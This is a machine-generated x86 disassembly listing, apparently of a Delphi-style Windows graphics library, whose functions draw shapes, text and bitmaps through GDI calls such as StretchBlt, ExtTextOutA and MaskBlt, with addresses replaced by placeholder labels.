cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422b04
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4232e0
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_4240d0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423f1c
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_423f38
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_424104
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_423614
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424afc
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423b40
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424b1c
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e0c
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424b3c
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_41864c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4241c8
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4186e8
xor edx edx
mov eax esi
call sub_424934
mov eax [ esi + 0xc ]
call sub_403290
mov eax [ esi + 0x10 ]
call sub_403290
mov eax [ esi + 0x14 ]
call sub_403290
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4188e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_424224
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424988
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4242ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
mov eax [ ebx + 0x14 ]
call sub_423fac
call sub_4232e0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4232e0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_416cd4
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424358
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Ellipse
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4243a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
mov eax [ ebx + 0x14 ]
call sub_423fe8
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4243dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
mov eax [ ebx + 0x14 ]
call sub_423fe8
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_424418
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_424478
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_4244a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4244ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call RoundRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42453c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424578
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_4248b4
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_4245a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
mov eax ebx
call sub_424578
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_4042c8
push eax
mov eax esi
call sub_4044c8
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_424714
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_424478
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_424714
inc eax
add edi eax
sub_424630
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
mov edi [ ebx + 0x54 ]
or edi 0x4
mov eax [ ebx + 0x14 ]
call sub_4240c8
cmp al 0x1
je r-xdata
test [ ebx + 0x54 ] 0x80
je r-xdata
or edi 0x2
push 0x0
mov eax esi
call sub_4042c8
push eax
mov eax esi
call sub_4044c8
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_424578
cmp al 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_424714
inc eax
add [ ebp - 0x4 ] eax
sub_4246d0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4042c8
push eax
mov eax edi
call sub_4044c8
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_424714
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_4246d0
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_424730
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_4246d0
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_424750
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_42479c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4247a3
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_424450
sub_4247fc
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_424820
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_424478
pop ecx
pop edx
pop edi
pop esi
retn
sub_424840
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_42486c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424988
mov eax [ ebp + 0x8 ]
call sub_4232e0
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4248d4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_424934
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_4248d4
mov edx esp
mov eax ebx
call sub_4247fc
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_424820
sub_424988
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_424a24
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
test bl 0x8
je r-xdata
mov eax esi
call sub_424a50
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_424a80
sub_424a24
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_4237fc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4232e0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_424a50
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_423cfc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_424a80
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_423fe8
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_423fe8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_4240c8
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_423fac
call sub_4232e0
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_423fac
call sub_4232e0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_424ba4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_424bee
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424bf5
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_424bf8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_424c94
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_424ba4
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404278
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c9b
lea eax [ ebp - 0x104 ]
call sub_404008
retn
sub_424cb0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_424dfe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_424d6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_424bf8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_424bf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e05
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_424e10
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_424e44
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_424ca0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4250c4
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424ca0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250cb
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push r--data
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push r--data
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424ca0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_424f17
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406b40
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250cb
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_4250d8
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_425110
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402ca4
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_425188
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_4251e0
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028c8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4252dd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
